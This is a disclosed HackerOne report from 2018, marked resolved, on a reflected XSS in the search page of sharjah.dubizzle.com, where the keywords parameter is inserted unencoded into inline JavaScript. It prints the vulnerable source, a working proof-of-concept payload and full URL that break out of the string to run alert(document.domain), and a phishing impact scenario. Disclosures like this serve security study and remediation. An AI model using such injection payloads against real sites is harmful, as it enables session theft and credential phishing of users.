---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '363571'
original_report_id: '363571'
title: Search Page Reflected XSS on sharjah.dubizzle.com through unencoded output
  of GET parameter in JavaScript
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: olx
created_at: '2018-06-08T20:16:29.471Z'
disclosed_at: '2018-12-16T11:18:03.766Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Search Page Reflected XSS on sharjah.dubizzle.com through unencoded output of GET parameter in JavaScript

## Metadata

- HackerOne Report ID: 363571
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: olx
- Disclosed At: 2018-12-16T11:18:03.766Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I found a reflected XSS vulnerability on the search page of sharjah.dubizzle.com.
Because the GET parameter `keywords` is not being encoded before parsing it into the JavaScript, an attacker can break out of the code an execute JavaScript in the targets browser.

### Vulnerable Code

When searching for `testtestfirsthackeronereport` (https://sharjah.dubizzle.com/search/?keywords=testtestfirsthackeronereport&is_basic_search_widget=1&is_search=1), the source of the page will look like the following:

```
var pageOptions = {
	"query": "testtestfirsthackeronereport Sharjah",
	"pubId": "partner-dubizzle-search",
	"adPage": "1",
	"location": false,
	"hl": "en ",
	"channel": "search",
	"number": 4,
	"sellerRatings": false,
	"linkTarget": "_blank",
        
	"adsafe": "medium"
};
```

Altering the search term to `test"` will result in the following output in the source of the page:

```
var pageOptions = {
	"query": "test" Sharjah",
	"pubId": "partner-dubizzle-search",
	"adPage": "1",
	"location": false,
	"hl": "en ",
	"channel": "search",
	"number": 4,
	"sellerRatings": false,
	"linkTarget": "_blank",
        
	"adsafe": "medium"
};
```

I decided to close the variable definiton, execute my code, and readd the exact same code, which has been executed before, again after running my code, so there won't be any JavaScript errors and the payload will be executed.

### PoC

The final payload is: `fghgfhgfh"}%3Balert('XSS Paul Dannewitz '%2Bdocument.domain)%3B var pageOptions %3D {"query"%3A "`
URL: https://sharjah.dubizzle.com/search/?keywords=fghgfhgfh"}%3Balert('XSS%20Paul%20Dannewitz%20'%2Bdocument.domain)%3B%20var%20pageOptions%20%3D%20{"query"%3A%20"&is_basic_search_widget=1&is_search=1

{F306774}

The PoC will be parsed to:

```
var pageOptions = {
	"query": "fghgfhgfh"};alert('XSS Paul Dannewitz'+document.domain); var pageOptions = {"query": " Sharjah",
	"pubId": "partner-dubizzle-search",
	"adPage": "1",
	"location": false,
	"hl": "en ",
	"channel": "search",
	"number": 4,
	"sellerRatings": false,
	"linkTarget": "_blank",
        
	"adsafe": "medium"
};
```

## Impact

The most simple thing an attacker could do is sending a malicious link to a dubizzle user, whichs redirects the user/victim to the attackers page - which is a dubizzle phishing site - via JavaScript and steal the login credentials. There are probably more creative ways of using the ability to run JavaScript in the victims browser on dubizzle.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
